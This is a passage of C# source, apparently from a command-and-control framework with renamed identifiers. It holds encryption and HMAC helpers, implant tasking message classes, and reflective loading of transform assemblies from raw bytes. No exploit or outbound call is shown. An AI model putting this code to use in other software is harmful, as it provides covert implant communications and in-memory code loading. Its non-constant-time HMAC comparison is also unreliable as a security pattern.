                    Convert.FromBase64String(encryptedMessage.IV).Concat(Convert.FromBase64String(encryptedMessage.EncMsg)).ToArray(),
                    key
                );
            }

            public static byte[] ComputeHMAC(byte[] data, byte[] key)
            {
                using (HMACSHA256 SessionHmac = new HMACSHA256(key))
                {
                    return SessionHmac.ComputeHash(data);
                }
            }

            public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
            {
                using (HMACSHA256 hmac = new HMACSHA256(key))
                {
                    byte[] calculatedHash = hmac.ComputeHash(hashedBytes);

                    // Should do double hmac?
                    return Enumerable.SequenceEqual(calculatedHash, hash);
                }
            }

            public static byte[] RSAEncrypt(byte[] toEncrypt, string RSAPublicKeyXMLString)
            {
                using (RSA RSAPublicKey = RSA.Create())
                {
                    RSAKeyExtensions.FromXmlString(RSAPublicKey, RSAPublicKeyXMLString);
                    return RSAPublicKey.Encrypt(toEncrypt, RSAEncryptionPadding.OaepSHA1);
                }
            }

            public static byte[] MofoRSAEncrypt(APIModels.Mofo mofo, byte[] toEncrypt)
            {
                return EncryptUtilities.RSAEncrypt(toEncrypt, Common.LemonSqueezyEncoding.GetString(Convert.FromBase64String(mofo.MofoRSAPublicKey)));
            }
        }

        internal class ModelUtilities
        {
            public string ProfileTransform(ProfileTransformAssembly ProfileTransformAssembly, byte[] bytes)
            {
                Assembly TransformAssembly = Assembly.Load(ProfileTransformAssembly.ProfileTransformBytes);
                Type t = TransformAssembly.GetType("MessageTransform");
                return (string)t.GetMethod("Transform").Invoke(null, new object[] { bytes });
            }

            public byte[] ProfileInvert(ProfileTransformAssembly ProfileTransformAssembly, string str)
            {
                Assembly TransformAssembly = Assembly.Load(ProfileTransformAssembly.ProfileTransformBytes);
                Type t = TransformAssembly.GetType("MessageTransform");
                return (byte[])t.GetMethod("Invert").Invoke(null, new object[] { str });
            }

            public partial class MofoTaskingMessage
            {
                public MofoTaskingMessage()
                {
                    CustomInit();
                }
                public MofoTaskingMessage(APIModels.MofoTaskingType? type = default(APIModels.MofoTaskingType?), string name = default(string), string message = default(string), bool? token = default(bool?))
                {
                    Type = type;
                    Name = name;
                    Message = message;
                    Token = token;
                    CustomInit();
                }
                partial void CustomInit();
                [JsonProperty(PropertyName = "type")]
                public APIModels.MofoTaskingType? Type { get; set; }
                [JsonProperty(PropertyName = "name")]
                public string Name { get; set; }
                [JsonProperty(PropertyName = "message")]
                public string Message { get; set; }
                [JsonProperty(PropertyName = "token")]
                public bool? Token { get; set; }
            }

            public partial class MofoTaskingMessageResponse
            {
                public MofoTaskingMessageResponse()
                {
                    CustomInit();
                }
                public MofoTaskingMessageResponse(APIModels.MofoTaskingStatus? status = default(APIModels.MofoTaskingStatus?), string output = default(string))
                {
                    Status = status;
                    Output = output;
                    CustomInit();
                }
                partial void CustomInit();
                [JsonProperty(PropertyName = "status")]
                public APIModels.MofoTaskingStatus? Status { get; set; }
                [JsonProperty(PropertyName = "output")]
                public string Output { get; set; }
            }

            public enum MofoEncMsgType
            {
                Routing,
                Tasking
            }

            public class MofoEncMsg
            {
                public string SOMEID { get; set; }
                public MofoEncMsgType Type { get; set; }
                public string Meta { get; set; } = "";

                public string IV { get; set; }
                public string EncMsg { get; set; }
                public string HMAC { get; set; }

                private static MofoEncMsg Create(string SOMEID, byte[] message, byte[] key, MofoEncMsgType Type = MofoEncMsgType.Tasking)
                {
                    byte[] encryptedMessagePacket = EncryptUtilities.AesEncrypt(message, key);
                    byte[] encryptionIV = encryptedMessagePacket.Take(Common.AesIVLength).ToArray();
                    byte[] encryptedMessage = encryptedMessagePacket.TakeLast(encryptedMessagePacket.Length - Common.AesIVLength).ToArray();
                    byte[] hmac = EncryptUtilities.ComputeHMAC(encryptedMessage, key);
                    return new MofoEncMsg
                    {
                        SOMEID = SOMEID,
                        Type = Type,
                        EncMsg = Convert.ToBase64String(encryptedMessage),
                        IV = Convert.ToBase64String(encryptionIV),
                        HMAC = Convert.ToBase64String(hmac)
                    };
                }

                public static MofoEncMsg Create(APIModels.Mofo mofo, byte[] message, MofoEncMsgType Type = MofoEncMsgType.Tasking)
                {
                    if (mofo.Status == APIModels.MofoStatus.Uninitialized || mofo.Status == APIModels.MofoStatus.Stage0)
                    {
                        return Create(mofo.Guid, message, Convert.FromBase64String(mofo.MofoSharedSecretPassword), Type);
                    }
                    return Create(mofo.Guid, message, Convert.FromBase64String(mofo.MofoNegotiatedSessKEy), Type);
                }

                public bool VerifyHMAC(byte[] Key)
                {
                    if (IV == "" || EncMsg == "" || HMAC == "" || Key.Length == 0) { return false; }
                    try
                    {
                        var hashedBytes = Convert.FromBase64String(this.EncMsg);
                        return EncryptUtilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
                    }
                    catch
                    {
                        return false;
                    }
                }
            }

            // Data should be of format: IV (16 bytes) + EncryptedBytes
            public byte[] MofoSessionDecrypt(APIModels.Mofo mofo, byte[] data)
            {
                return EncryptUtilities.AesDecrypt(data, Convert.FromBase64String(mofo.MofoNegotiatedSessKEy));
            }

            // Convenience method for decrypting a MofoEncMsg
            public byte[] MofoSessionDecrypt(APIModels.Mofo mofo, MofoEncMsg mofoEncMsg)
            {
                return this.MofoSessionDecrypt(mofo, Convert.FromBase64String(mofoEncMsg.IV)
                    .Concat(Convert.FromBase64String(mofoEncMsg.EncMsg)).ToArray());
            }
        }
    }

    internal static class RSAKeyExtensions
    {
        public static void FromXmlString(this RSA rsa, string xmlString)
        {
            RSAParameters parameters = new RSAParameters();

            XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.LoadXml(xmlString);

            if (xmlDoc.DocumentElement.Name.Equals("RSAKeyValue"))
            {
                foreach (XmlNode node in xmlDoc.DocumentElement.ChildNodes)
                {
                    switch (node.Name)
                    {
                        case "Modulus": parameters.Modulus = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "Exponent": parameters.Exponent = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "P": parameters.P = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "Q": parameters.Q = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "DP": parameters.DP = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "DQ": parameters.DQ = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "InverseQ": parameters.InverseQ = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                        case "D": parameters.D = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
                    }
                }
            }
            else
            {
                throw new Exception("Invalid XML RSA key.");
            }

            rsa.ImportParameters(parameters);
        }

        public static string ToXmlString(this RSA rsa, bool includePrivateParameters)
        {
            RSAParameters parameters = rsa.ExportParameters(includePrivateParameters);

            return string.Format("<RSAKeyValue><Modulus>{0}</Modulus><Exponent>{1}</Exponent><P>{2}</P><Q>{3}</Q><DP>{4}</DP><DQ>{5}</DQ><InverseQ>{6}</InverseQ><D>{7}</D></RSAKeyValue>",
                  parameters.Modulus != null ? Convert.ToBase64String(parameters.Modulus) : null,
                  parameters.Exponent != null ? Convert.ToBase64String(parameters.Exponent) : null,
                  parameters.P != null ? Convert.ToBase64String(parameters.P) : null,
                  parameters.Q != null ? Convert.ToBase64String(parameters.Q) : null,
                  parameters.DP != null ? Convert.ToBase64String(parameters.DP) : null,
                  parameters.DQ != null ? Convert.ToBase64String(parameters.DQ) : null,
                  parameters.InverseQ != null ? Convert.ToBase64String(parameters.InverseQ) : null,
                  parameters.D != null ? Convert.ToBase64String(parameters.D) : null);
        }
    }
}
